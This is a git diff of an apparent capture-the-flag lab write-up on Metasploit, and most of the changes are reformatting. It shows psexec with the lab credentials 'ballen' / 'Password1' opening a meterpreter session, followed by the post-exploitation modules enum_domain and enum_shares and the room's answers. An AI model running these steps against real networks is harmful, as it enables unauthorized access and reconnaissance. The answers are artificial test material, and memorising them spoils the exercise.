@@ -679,9 +679,14 @@ Module options (exploit/windows/smb/psexec):
 
 ```
 Step 4: set smbuser ballen
+
 Step 5: set smbpass Password1
+
 step 6: show options 
+
 step 7: run  --> meterpreter session started!!!
+
+---
 
 What is the computer name? ACME-TEST
 
@@ -700,8 +705,10 @@ Meterpreter     : x86/windows
 ---
 What is the target domain? Flash (Step 9-12)
 
-step 9: Hint: 
+Hint: 
 Use the "post/windows/gather/enum_domain" module. You will need to "background" Meterpreter first and set the "SESSION" parameter.
+
+step 9: 
 ```
 background
 ```
@@ -716,7 +723,9 @@ step 10: session -i to check if the session still running
 session -i
 ```
 step 11: use the "post/windows/gather/enum_domain" module
+
 step 12: set the session running meterpreter session 1 as parameter
+
 ```
 set session 1
 run
@@ -737,9 +746,12 @@ What is the name of the share likely created by the user?
 speedster (step 13-15)
 
 step 13: use the "post/windows/gather/enum_shares" module
+
 step 14: set session 1
+
 step 15: run
 ```
+
 msf6 post(windows/gather/enum_shares) > set session 1
 session => 1
 msf6 post(windows/gather/enum_shares) > run
